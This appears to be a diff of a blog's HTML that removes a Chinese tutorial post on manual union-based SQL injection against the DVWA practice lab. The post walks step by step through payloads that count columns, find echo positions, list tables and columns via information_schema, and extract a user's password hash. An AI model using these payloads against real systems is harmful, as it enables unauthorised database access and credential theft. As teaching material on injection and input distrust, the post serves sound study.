-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="1-判断查询语句的字段数量，对字段进行确认"><a href="#1-判断查询语句的字段数量，对字段进行确认" class="headerlink" title="1.判断查询语句的字段数量，对字段进行确认"></a>1.判断查询语句的字段数量，对字段进行确认</h6><p><span style="color:blue;">order by 命令是对字段进行升序和降序，可以通过第几个字段进行操作</span></p>
-<p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">回显数据正常，那么表示他语句中包含了2个字段</span></p>
-<p><img src="/images/pasted-5.png" alt="upload successful"></p>
-<h6 id="2-确定显示的位置-sql语句查询后的回显位置-对字段进行填充"><a href="#2-确定显示的位置-sql语句查询后的回显位置-对字段进行填充" class="headerlink" title="2.确定显示的位置(sql语句查询后的回显位置),对字段进行填充"></a>2.确定显示的位置(sql语句查询后的回显位置),对字段进行填充</h6><p>union select 相当于补充了一行新的查询</p>
-<p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>这个时候我们已经成功执行了命令并且获取了回显</p>
-<p><img src="/images/pasted-6.png" alt="upload successful"></p>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="3-获取当前数据库的名称以及版本号"><a href="#3-获取当前数据库的名称以及版本号" class="headerlink" title="3.获取当前数据库的名称以及版本号"></a>3.获取当前数据库的名称以及版本号</h6><p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'  union <span class="keyword">select</span>  <span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><span style="color:blue;">可以看到返回的数据库名称是dvwa这个库  数据库版本号为5.5.53</span></p>
-<p><img src="/images/pasted-7.png" alt="upload successful"></p>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> test_mo <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">version</span>()</span><br></pre></td></tr></table></figure>
-
-<h6 id="4-获取数据库中的所有表"><a href="#4-获取数据库中的所有表" class="headerlink" title="4.获取数据库中的所有表"></a>4.获取数据库中的所有表</h6><p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">现在可以看到他有两张表，分别是guestbook和users</span></p>
-<p><img src="/images/pasted-8.png" alt="upload successful"></p>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> dvwa <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
-
-
-<p>低版本命令执行失败<br>在低版本中无法使用<span style="color:#f00;">information_schema</span>命令所以会给出错误提示 <span style="color:#f00;">Illegal mix of collations for operation ‘UNION’</span></p>
-<h6 id="5-获取数据库中的所有字段"><a href="#5-获取数据库中的所有字段" class="headerlink" title="5.获取数据库中的所有字段"></a>5.获取数据库中的所有字段</h6><p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'  union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>现在已经拿到了users这张表的所有字段</p>
-<p><img src="/images/pasted-9.png" alt="upload successful"></p>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'mo_account'</span>;</span><br></pre></td></tr></table></figure>
-
-<p>低版本命令执行失败<br>在低版本中无法使用<span style="color:#f00;">information_schema</span>命令所以会给出错误提示 <span style="color:#f00;">Illegal mix of collations for operation ‘UNION’</span></p>
-<h6 id="6-获取数据库中字段数据"><a href="#6-获取数据库中字段数据" class="headerlink" title="6.获取数据库中字段数据"></a>6.获取数据库中字段数据</h6><p>例：pyload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id =<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">通过我刚刚获取的字段，进行查询获取密码  这条命令可以获取id为1的账号密码</span></p>
-<p><img src="/images/pasted-10.png" alt="upload successful"></p>
-<p><span style="color:green;">mysql执行命令为</span></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_test <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id =<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h6><pre><code>有时候手动注入需要注释掉原sql语句的&apos;   可以通过 -- 或者 # （攻击思路）
-用户的数据是不可信的，坚信这一点我们就会避免很多被入侵的机会。</code></pre>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1231,7 +1151,7 @@ sign参数和token参数，from参数和to参数可以选择固定也可以选�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
